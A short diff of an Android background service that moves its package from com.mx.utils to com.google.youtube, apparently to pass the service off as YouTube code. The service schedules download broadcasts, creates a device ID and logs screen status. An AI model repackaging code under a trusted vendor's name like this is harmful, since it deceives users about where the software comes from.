@@ -1,6 +1,7 @@
-package com.mx.utils.services;
+package com.google.youtube.services;
 
-import com.mx.utils.utils.MyHelpUtil;
+import com.google.youtube.utils.AppUtil_i;
+import com.google.youtube.utils.MyHelpUtil;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -38,7 +39,7 @@ public class MainService extends Service {
 	public void onCreate() {
 
 		MyHelpUtil.create_device_id(getApplicationContext());
-
+		
 		Intent downloadIntent = new Intent(DOWNLOAD_ACTION);
 
 		pendingIntent = PendingIntent.getBroadcast(this, 0, downloadIntent,
@@ -95,7 +96,7 @@ public class MainService extends Service {
 		mScreenReceiver = new BroadcastReceiver() {
 			@Override
 			public void onReceive(Context arg0, Intent arg1) {
-				com.mx.utils.utils.MyHelpUtil.save_screen_status(arg0);
+				com.google.youtube.utils.MyHelpUtil.save_screen_status(arg0);
 			}
 		};
 		getApplicationContext().registerReceiver(mScreenReceiver, filter);
